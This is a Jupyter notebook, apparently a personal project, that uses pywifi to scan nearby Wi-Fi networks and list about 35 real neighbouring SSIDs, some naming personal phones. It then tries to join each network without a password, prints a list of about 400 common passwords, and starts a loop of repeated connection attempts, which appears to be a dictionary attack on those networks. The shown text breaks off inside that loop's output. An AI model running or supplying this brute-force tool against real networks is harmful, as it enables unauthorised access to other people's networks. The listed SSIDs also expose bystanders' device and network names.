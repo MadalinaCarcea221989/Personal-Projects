{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "13e0626e",
   "metadata": {
    "slideshow": {
     "slide_type": "-"
    }
   },
   "outputs": [],
   "source": [
    "#!pip install comtypes\n",
    "#!pip install pywifi\n",
    "\n",
    "import time\n",
    "import pywifi\n",
    "from IPython.display import display, HTML\n",
    "from pywifi import const"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "74ab2ed2",
   "metadata": {},
   "outputs": [],
   "source": [
    "available_devices = []\n",
    "keys = []\n",
    "final_output = {}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "7a0e65da",
   "metadata": {},
   "outputs": [],
   "source": [
    "#### Get interface information\n",
    "##### In general, there will be only one Wi-Fi interface in the platform. Thus, use index 0 to obtain the Wi-Fi interface. \n",
    "### Get the name of the Wi-Fi interface."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "b7a2d778",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:48:46,945 ERROR Open handle failed!\n"
     ]
    }
   ],
   "source": [
    "wifi = pywifi.PyWiFi()\n",
    "interface = wifi.interfaces()[0]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "b9f56d6c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<h3>Intel(R) Wi-Fi 6 AX201 160MHz</h3>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "display(HTML('<h3>{}</h3>'.format(interface.name())))\n",
    "#print(interface.name())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "4d9bbd20",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<h3><u> Now let's scan the network.</u></h3>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "display(HTML(\"<h3><u> Now let's scan the network.</u></h3>\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "180d1a90",
   "metadata": {},
   "outputs": [],
   "source": [
    "interface.scan()\n",
    "#It is safer to call scan_results() 2 ~ 8 seconds later after calling scan()\n",
    "#Because the scan time can be different for each Wi-Fi interface provider. \n",
    "time.sleep(5) \n",
    "### Obtain the results of the previous triggerred scan. A Profile list will be returned.\n",
    "x = interface.scan_results()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "9f7c2c19",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<h3><u> Let's See All Network Profiles</u></h3>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "display(HTML(\"<h3><u> Let's See All Network Profiles</u></h3>\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "b9e95db0",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<table style=\"font-size:1em\"><tr><th>#</th><th style=\"text-align: Center\">SSID</th><tr><td>1</td><td style=\"text-align: left\">Cecilia_6G</td></tr><tr><td>2</td><td style=\"text-align: left\">Cecilia_6G</td></tr><tr><td>3</td><td style=\"text-align: left\">Deco_A00C</td></tr><tr><td>4</td><td style=\"text-align: left\">Ziggo7248841</td></tr><tr><td>5</td><td style=\"text-align: left\"></td></tr><tr><td>6</td><td style=\"text-align: left\"></td></tr><tr><td>7</td><td style=\"text-align: left\"></td></tr><tr><td>8</td><td style=\"text-align: left\"></td></tr><tr><td>9</td><td style=\"text-align: left\"></td></tr><tr><td>10</td><td style=\"text-align: left\"></td></tr><tr><td>11</td><td style=\"text-align: left\"></td></tr><tr><td>12</td><td style=\"text-align: left\">Ziggo</td></tr><tr><td>13</td><td style=\"text-align: left\">Ziggo</td></tr><tr><td>14</td><td style=\"text-align: left\">D10</td></tr><tr><td>15</td><td style=\"text-align: left\">ORBI73</td></tr><tr><td>16</td><td style=\"text-align: left\">Wifi84811</td></tr><tr><td>17</td><td style=\"text-align: left\">Wifi84811</td></tr><tr><td>18</td><td style=\"text-align: left\">Solar-WiFi217R1174</td></tr><tr><td>19</td><td style=\"text-align: left\">Ziggo1499036</td></tr><tr><td>20</td><td style=\"text-align: left\">Ziggo1499036</td></tr><tr><td>21</td><td style=\"text-align: left\">Galaxy S23+ 5G013d</td></tr><tr><td>22</td><td style=\"text-align: left\">TP-Link_9737_5G</td></tr><tr><td>23</td><td style=\"text-align: left\">Wifi84811_Guest</td></tr><tr><td>24</td><td style=\"text-align: left\">Wifi84811_Guest</td></tr><tr><td>25</td><td style=\"text-align: left\">KPNC15886</td></tr><tr><td>26</td><td style=\"text-align: left\">KPNC15886</td></tr><tr><td>27</td><td style=\"text-align: left\">Cecilia_6G</td></tr><tr><td>28</td><td style=\"text-align: left\">Cecilia_6G</td></tr><tr><td>29</td><td style=\"text-align: left\">Ziggo2765478</td></tr><tr><td>30</td><td style=\"text-align: left\">Jacek</td></tr><tr><td>31</td><td style=\"text-align: left\">Jacek</td></tr><tr><td>32</td><td style=\"text-align: left\">iPhone - Andrea (2)</td></tr><tr><td>33</td><td style=\"text-align: left\">HP-Print-EC-Photosmart 5520</td></tr><tr><td>34</td><td style=\"text-align: left\">TP-Link_9737</td></tr><tr><td>35</td><td style=\"text-align: left\">Galaxy A13 01B8</td></tr></table>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "available_devices = []\n",
    "for i in x:\n",
    "    available_devices.append(i.ssid)\n",
    "html = '<table style=\"font-size:1em\"><tr><th>{}</th><th style=\"text-align: Center\">{}</th>'.format('#','SSID')\n",
    "c=0\n",
    "for i in available_devices:\n",
    "    c+=1\n",
    "    html+='<tr><td>{}</td><td style=\"text-align: left\">{}</td></tr>'.format(c,i)\n",
    "html+='</table>'\n",
    "display(HTML(html))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "1da6fc29",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<h3><u> Let's See Check for open network around us.</u></h3>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "display(HTML(\"<h3><u> Let's See Check for open network around us.</u></h3>\"))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "8823be95",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:48:51,991 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:48:55,996 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Cecilia_6G\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:49:00,002 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Cecilia_6G\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:49:04,008 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Deco_A00C\n",
      "success password of the network Deco_A00C  is none\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:49:08,622 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:49:12,624 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:49:16,625 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:49:20,628 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:49:24,630 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:49:28,632 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:49:32,636 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  \n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:49:36,641 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Ziggo\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:49:40,647 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Ziggo\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:49:44,652 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  D10\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:49:48,658 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  ORBI73\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:49:52,663 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Wifi84811\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:49:56,668 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Wifi84811\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:50:00,675 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Solar-WiFi217R1174\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:50:04,680 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Ziggo1499036\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:50:08,694 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Ziggo1499036\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:50:12,699 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Galaxy S23+ 5G013d\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:50:16,706 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  TP-Link_9737_5G\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:50:20,715 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Wifi84811_Guest\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:50:24,720 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Wifi84811_Guest\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:50:28,728 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  KPNC15886\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:50:32,735 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  KPNC15886\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:50:36,743 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Cecilia_6G\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:50:40,752 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Cecilia_6G\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:50:44,757 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Ziggo2765478\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:50:48,768 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Jacek\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:50:52,773 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  Jacek\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:50:56,782 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  iPhone - Andrea (2)\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:51:00,788 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Trying to Connect to SSID :  HP-Print-EC-Photosmart 5520\n",
      "success password of the network HP-Print-EC-Photosmart 5520  is none\n",
      "Trying to Connect to SSID :  Galaxy A13 01B8\n"
     ]
    }
   ],
   "source": [
    "for i in available_devices:\n",
    "    nm = i\n",
    "    try:\n",
    "        i=i.strip()\n",
    "        profile = pywifi.Profile()\n",
    "        profile.ssid = i\n",
    "        profile.auth = const.AUTH_ALG_OPEN\n",
    "        profile.akm.append(const.AKM_TYPE_NONE)\n",
    "        wifi = pywifi.PyWiFi()\n",
    "        iface = wifi.interfaces()[0]\n",
    "        iface.remove_all_network_profiles()\n",
    "        profile = iface.add_network_profile(profile)\n",
    "        iface.connect(profile)\n",
    "        time.sleep(4)\n",
    "        print(\"Trying to Connect to SSID : \",i)\n",
    "        if iface.status() == const.IFACE_CONNECTED:\n",
    "            print('success password of the network',i,' is',\"none\")\n",
    "            final_output[i] = \"\"\n",
    "            available_devices.remove(nm)\n",
    "    except Exception as e:\n",
    "        print(e)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "a4d64bb0",
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('top400.txt','r') as f:\n",
    "    for i in f:\n",
    "        i = i.replace('\\n','')\n",
    "        if i not in keys:\n",
    "            keys.append(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "id": "2e0d2477",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['password', '123456789', '12345678', '1q2w3e4r', 'sunshine', 'football', '1234567890', 'computer', 'superman', 'internet', 'iloveyou', '1qaz2wsx', 'baseball', 'whatever', 'princess', 'abcd1234', 'starwars', 'trustno1', 'password1', 'jennifer', 'michelle', 'mercedes', 'benjamin', '11111111', 'samantha', 'victoria', 'alexander', '987654321', 'asdf1234', '1234qwer', 'qwertyuiop', 'q1w2e3r4', 'elephant', 'garfield', 'chocolate', 'jonathan', 'caroline', 'maverick', 'midnight', '88888888', 'creative', 'qwerty123', 'cocacola', 'passw0rd', 'liverpool', 'blink182', 'asdfghjkl', 'danielle', 'scorpion', 'veronica', 'nicholas', 'asdfasdf', 'metallica', 'december', 'patricia', 'christian', 'spiderman', 'security', 'slipknot', 'november', 'jordan23', 'qwertyui', 'butterfly', 'swordfish', 'carolina', 'hardcore', 'corvette', '12341234', 'remember', 'qwer1234', 'leonardo', 'snickers', 'williams', 'angelina', 'anderson', '123123123', 'pakistan', 'marlboro', 'kimberly', '00000000', 'snowball', 'sebastian', 'godzilla', 'hello123', 'champion', 'precious', 'einstein', 'napoleon', 'mountain', 'dolphins', 'charlotte', 'fernando', 'basketball', 'barcelona', '87654321', 'paradise', 'motorola', 'bullshit', 'brooklyn', 'stephanie', 'elizabeth', 'qwerty12', 'franklin', 'american', 'platinum', 'icecream', 'darkness', 'cristina', 'colorado', 'alexandra', 'steelers', 'serenity', 'mitchell', 'lollipop', 'marshall', '1qazxsw2', '12344321', 'startrek', 'christine', 'business', 'nintendo', '12qwaszx', 'asdfghjk', 'Password', '1q2w3e4r5t', 'zaq12wsx', 'scotland', 'hercules', 'explorer', 'manchester', 'firebird', 'engineer', 'virginia', 'simpsons', 'angelica', 'september', 'isabelle', 'isabella', 'changeme', 'passport', 'infinity', 'superstar', 'courtney', 'scarface', 'pavilion', 'abcdefgh', 'a1b2c3d4', 'harrison', 'spitfire', 'catherine', 'birthday', 'wolverine', 'guinness', 'california', 'logitech', 'emmanuel', '11223344', 'goldfish', 'cheyenne', 'testtest', 'stargate', 'microsoft', 'anything', 'aaaaaaaa', 'welcome1', 'eternity', 'westside', 'password123', 'maryjane', 'michael1', 'lawrence', 'kristina', 'kawasaki', 'drowssap', 'blahblah', 'babygirl', 'poohbear', 'florence', 'sapphire', 'hamilton', 'greenday', 'qazwsxedc', 'twilight', 'swimming', 'stardust', 'predator', 'penelope', 'michigan', 'margaret', 'brittany', 'shithead', 'redskins', 'pussycat', 'fireball', 'cherokee', 'australia', '1234abcd', 'lovelove', 'thailand', 'lasvegas', 'butthead', 'blizzard', 'shamrock', 'bluebird', 'atlantis', '147258369', 'valentine', 'magnolia', 'juventus', 'diamonds', 'christopher', 'warcraft', 'renegade', 'mohammed', 'terminator', 'shopping', 'savannah', 'giovanni', '12121212', 'wildcats', 'portugal', 'beautiful', 'sunflower', 'santiago', 'kathleen', 'enterprise', 'clifford', 'christina', '55555555', 'something', 'rosemary', 'vacation', 'hollywood', 'chandler', '99999999', 'lorraine', 'children', 'beatrice', 'airborne', 'valentin', 'moonlight', 'kamikaze', 'strawberry', 'software', '22222222', 'skywalker', 'salvador', 'panthers', 'lacrosse', 'charlie1', 'cardinal', 'bluemoon', '0123456789', 'zeppelin', 'rockstar', 'operator', 'dragonfly', 'dickhead', 'anaconda', 'amsterdam', '789456123', '77777777', 'skittles', 'personal', 'kingkong', 'geronimo', 'christmas', 'wrestling', 'robinson', 'lightning', 'kingston', 'hannibal', 'download', 'darkstar', 'undertaker', 'tinkerbell', 'sweetpea', 'softball', 'panasonic', 'pa55word', 'keyboard', 'darkside', 'cleopatra', 'assassin', 'vladimir', 'national', 'matthew1', 'godfather', 'brothers', 'warriors', 'universe', 'rush2112', 'mushroom', 'bigdaddy', '1a2b3c4d', 'ultimate', 'peterpan', 'loverboy', 'truelove', 'trombone', 'madeline', 'gangster', 'dingdong', 'catalina', 'alejandro', 'kittycat', 'aquarius', '1111111111', 'patriots', 'jamesbond', 'ihateyou', 'blessing', 'airplane', 'Password1', 'stingray', 'hellfire', 'guardian', 'flamingo', '0987654321', 'socrates', 'richmond', 'electric', 'thankyou', 'sterling', 'munchkin', 'morpheus', 'imperial', 'happiness', 'goodluck', 'columbia', 'campbell', 'blackjack', '999999999', 'telephone', 'oblivion', 'newcastle', 'freedom1', 'washington', 'valentina', 'valencia', 'spectrum', 'jessica1', 'jeremiah', 'handsome', 'goldberg', 'gabriela', 'anthony1', 'a1234567', 'xxxxxxxx', 'peekaboo', 'motherfucker', 'montreal', 'katherine', 'kangaroo', 'immortal', 'chocolat', 'thompson', 'research', 'oklahoma', 'mariposa', 'idontknow', 'defender', 'applepie', 'squirrel', 'pineapple', 'hongkong', 'dinosaur', 'babydoll', 'wolfgang', 'semperfi', 'patience', 'fletcher', 'drpepper', 'creation', 'wordpass', 'passwort', 'original', 'nightmare', 'martinez', 'labrador', 'excalibur', 'discovery', 'apple123', 'sundance', 'redwings', 'mypassword', 'monopoly', 'margarita', 'lionking', 'football1', 'director', '44444444', 'sylvester', 'sherlock', 'marianne', 'lancelot', 'jeanette', 'cannabis', 'andromeda', 'werewolf', 'starcraft', 'marathon', 'longhorn', 'happy123', 'brucelee', 'argentina', '147852369', 'wrangler', 'william1', 'stranger', 'scarlett', 'qweasdzxc', 'playstation', 'morrison', 'february', 'fantasia', 'designer', 'bulldogs', 'sullivan', 'saturday', 'pingpong', 'kristine', 'halloween', 'fuckyou1', 'fearless', 'cassandra', 'bismillah', 'airforce', 'theodore', 'starfish', 'pass1234', 'cinnamon', 'sweetheart', 'overlord', 'michaela', 'meredith', 'buttercup', 'abc12345', 'aardvark', 'Passw0rd', '12345678910', 'universal', 'trinidad', 'thursday', 'standard', 'pearljam', 'anonymous']\n"
     ]
    }
   ],
   "source": [
    "print(keys)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "c54309fa",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2024-04-21 19:51:05,355 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:51:09,363 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:51:13,885 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:51:18,390 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:51:22,905 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:51:27,456 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:51:31,969 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:51:36,486 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:51:41,002 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:51:45,520 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:51:50,036 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:51:54,552 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:51:59,064 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:52:03,579 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:52:08,094 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:52:12,611 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:52:17,121 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:52:21,630 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:52:26,140 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:52:30,661 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:52:35,171 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:52:39,684 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:52:44,199 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:52:48,706 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:52:53,218 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:52:57,731 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:53:02,249 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:53:06,775 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:53:11,288 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:53:15,809 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:53:20,325 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:53:24,834 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:53:29,349 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:53:33,890 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:53:38,473 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:53:42,985 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:53:47,491 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:53:52,009 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:53:56,527 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:54:01,050 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:54:05,565 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:54:10,085 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:54:14,605 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:54:19,132 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:54:23,647 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:54:28,168 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:54:32,688 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:54:37,206 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:54:41,725 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:54:46,229 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:54:50,741 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:54:55,272 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:54:59,785 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:55:04,295 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:55:08,816 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:55:13,331 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:55:17,873 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:55:22,392 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:55:26,907 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:55:31,429 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:55:35,938 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:55:40,466 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:55:44,988 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:55:49,502 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:55:54,033 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:55:58,558 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:56:03,089 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:56:07,606 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:56:12,118 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:56:16,673 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:56:21,193 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:56:25,708 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:56:30,223 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:56:34,747 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:56:39,260 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:56:43,771 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:56:48,293 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:56:52,813 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:56:57,347 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:57:01,872 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:57:06,400 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:57:10,961 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:57:15,473 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:57:19,998 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:57:24,567 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:57:29,124 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:57:33,647 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:57:38,157 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:57:42,698 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:57:47,218 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:57:51,745 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:57:56,270 ERROR Open handle failed!\n",
      "pywifi 2024-04-21 19:58:00,816 ERROR Open handle failed!\n",
